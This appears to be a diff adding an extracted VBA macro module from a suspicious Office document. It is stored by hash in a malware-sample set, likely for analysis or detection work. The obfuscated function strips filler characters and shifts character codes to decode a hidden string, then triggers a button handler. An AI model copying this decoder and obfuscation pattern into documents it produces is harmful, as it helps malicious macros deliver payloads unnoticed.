@@ -1,0 +1,57 @@
+Filename     : ./macros/7c4ee5ed1956a5e51c0d52e90da16337b6172ca5f75b966a9c58f9ad7535df04
+OLE stream   : Macros/VBA/Module2
+VBA filename : Module2.bas
+----------------------------------------
+Attribute VB_Name = "Module2"
+Function Bishbarbak(copotar, raspera)
+Dim SplitStr As String
+Dim pqjbiux() As Byte
+Dim k2 As String
+Dim j1 As String
+Dim maxe() As Byte
+Dim valSev() As Byte
+valSev = "FKSYRCM"
+AE = UserForm1.zunData(valSev)
+Dim silas As Integer
+Dim xopova As Integer
+Dim XrttacaI() As Byte
+k2 = valSev
+Dim I As Integer
+Dim Qapi2 As Integer
+Dim palacet As Integer
+palacet = 0
+I = 374
+Dim ngwiL As String
+xopova = 92 - copotar
+xopova = xopova - 1
+Dim hzmould As String
+j1 = raspera
+SplitStr = ""
+maxe = j1
+hzmould = "Wgekise"
+With UserForm1
+Qapi2 = .zunData(maxe)
+ngwiL = "Nirqc3"
+cometome = palacet
+For uD = cometome To Qapi2
+charo = palacet
+For zaLp1 = palacet To AE
+If maxe(uD) = valSev(zaLp1) Then charo = palacet + charo + 1
+Next
+If cometome = charo Then
+SplitStr = SplitStr + .parseStr(maxe(uD) - xopova)
+End If
+Next
+Bishbarbak = SplitStr
+silas = xopova + I
+.TextBox1.Text = SplitStr
+silas = -18 + Len(SplitStr) - silas
+If silas = 1 Then
+.com1_Click
+End If
+End With
+Rem end function
+End Function
+
+
+
